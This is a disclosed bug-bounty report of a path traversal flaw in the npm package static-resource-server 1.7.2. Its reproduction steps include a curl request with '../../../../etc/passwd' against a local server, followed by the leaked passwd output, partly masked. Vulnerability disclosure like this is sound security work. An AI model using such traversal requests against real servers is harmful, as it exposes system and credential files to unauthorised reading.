# [static-resource-server]  Path Traversal allows to read content of arbitrary file on the server

## Report Details
- **Report ID**: 432600
- **URL**: https://hackerone.com/reports/432600
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-11-01T06:25:40.078Z
- **Disclosed**: 2019-01-03T19:02:03.160Z

## Reporter
- **Username**: libcontainer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
# Module

**module name:** static-resource-server
**version:** 1.7.2
**npm page:** `https://www.npmjs.com/package/static-resource-server`

## Module Description

> A tiny http server that provides local static resource access 

## Module Stats

> Replace stats below with numbers from npm’s module page:

[0] downloads in the last day
[0] downloads in the last week
[12] downloads in the last month

~ 639 Downloads per Year

# Vulnerability

## Vulnerability Description

> Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

> install static-resource-server using npm

`$ npm install static-resource-server`

run server from command line:

`$ ./static-resource-server -P 8080 --root $HOME/data/static`

use curl to try accessing internal files

`$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd' `

Now the corresponding file will be loaded from the server and sent as response to the client ( curl )

Result:

```
##
# User Database
# 
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false
_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false
<<< MASKED DATA >>>
```


## Supporting Material/References:

- MacOS 10.14.1 
- Node version v10.11.0
- npm version  6.4.1

# Wrap up

- I contacted the maintainer to let them know: No
- I opened an issue in the related repository: No

## Impact

This vulnerability allows to read content of any file on the server

## Attachments
No attachments
